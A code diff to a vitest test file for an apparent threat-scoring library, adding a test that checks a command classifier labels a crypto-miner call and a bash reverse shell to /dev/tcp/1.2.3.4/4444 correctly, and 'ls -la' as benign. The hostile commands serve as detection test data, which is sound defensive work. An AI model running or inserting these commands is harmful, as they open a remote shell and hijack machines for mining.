@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { computeRiskScore, classifyCommands, deriveThreatTags } from '../src/lib/risk-score.js'
+import { computeRiskScore, classifyCommands, classifyCommand, deriveThreatTags } from '../src/lib/risk-score.js'
 
 describe('computeRiskScore', () => {
   it('still allows a single severe SSH actor to reach 100', () => {
@@ -102,6 +102,12 @@ describe('classifyCommands', () => {
     const result = classifyCommands(['crontab -l'])
     expect(result.recon).toContain('crontab -l')
     expect(result.persistence).toHaveLength(0)
+  })
+
+  it('classifyCommand returns the single first-match category, null for benign', () => {
+    expect(classifyCommand('xmrig -o pool.minexmr.com:4444')).toBe('crypto_mining')
+    expect(classifyCommand('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')).toBe('reverse_shell')
+    expect(classifyCommand('ls -la')).toBeNull()
   })
 
   it('rejects benign lookalikes', () => {
